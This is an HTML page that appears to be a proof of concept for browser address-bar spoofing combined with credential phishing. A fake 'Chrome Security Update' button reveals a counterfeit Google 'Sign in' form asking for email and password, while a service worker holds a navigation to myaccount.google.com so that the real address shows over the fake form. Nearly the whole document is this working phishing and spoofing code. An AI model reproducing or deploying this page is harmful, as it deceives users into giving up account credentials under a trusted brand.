<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; text-align: center; padding: 100px 20px; transition: background 0.5s; }
        .hidden { display: none; }
        .btn { background: #4285f4; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 18px; cursor: pointer; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
    </style>
</head>
<body>

    <div id="initial">
        <h2>Chrome Security Update</h2>
        <p>A new security patch is available for your mobile browser.</p>
        <button class="btn" onclick="triggerSpoof()">Install Update</button>
    </div>

    <div id="fakeUI" class="hidden">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
        <h3>Sign in</h3>
        <p>Confirm your identity to proceed</p>
        <input type="email" placeholder="Email or phone">
        <input type="password" placeholder="Enter your password">
        <button class="btn">Next</button>
    </div>

    <script>
        // Register the Service Worker to intercept the next request
        navigator.serviceWorker.register('sw.js');

        function triggerSpoof() {
            // 1. Show the fake UI locally
            document.getElementById('initial').classList.add('hidden');
            document.getElementById('fakeUI').classList.remove('hidden');

            // 2. Trigger navigation to the target
            // The Service Worker will 'hang' this request for 5 seconds
            window.location.href = "https://myaccount.google.com/?exploit=true";
        }
    </script>
</body>
</html>
